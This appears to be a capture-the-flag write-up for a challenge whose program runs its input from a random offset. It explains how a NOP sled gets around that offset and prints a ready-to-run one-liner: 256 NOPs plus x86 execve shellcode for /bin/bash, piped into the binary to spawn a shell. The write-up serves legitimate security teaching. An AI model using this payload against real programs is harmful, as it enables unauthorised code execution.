# slippery-shellcode
This [program](vuln) is a little bit more tricky. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/slippery-shellcode_4_64839254839978b32eb661ca92071d48 on the shell server. [Source](vuln).

## Hint
None

## Solution
Like the handy-shellcode challenge, this program executes the input we send, however, it does it in a more interesting way:
```c
  int offset = (rand() % 256) + 1;
  
  ((void (*)())(buf+offset))();
```
It assigns a random "offset" from 1 to 256, adds that to the location of the beginning of the buffer, and executes it from there. This means it will execute the shellcode we pass in from a random location: anywhere between 1 to 256 bytes from the beginning. However, we can fill in the beginning of the buffer with 256 bytes of NOP characters (\x90), or any opcodes really that don't mess with the actual shellcode. This allows us to bypass the random executing of our buffer, as the program will always hit one of the 256 nop characters, "slide down" these nop's and hit our shellcode no matter what. We then keep the pipe open with `cat -` like before. Thus our payload looks like this (shellcode from http://shell-storm.org/shellcode/files/shellcode-606.php):
```(python -c "print '\x90'*256+'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'"; cat -)|  ./vuln```
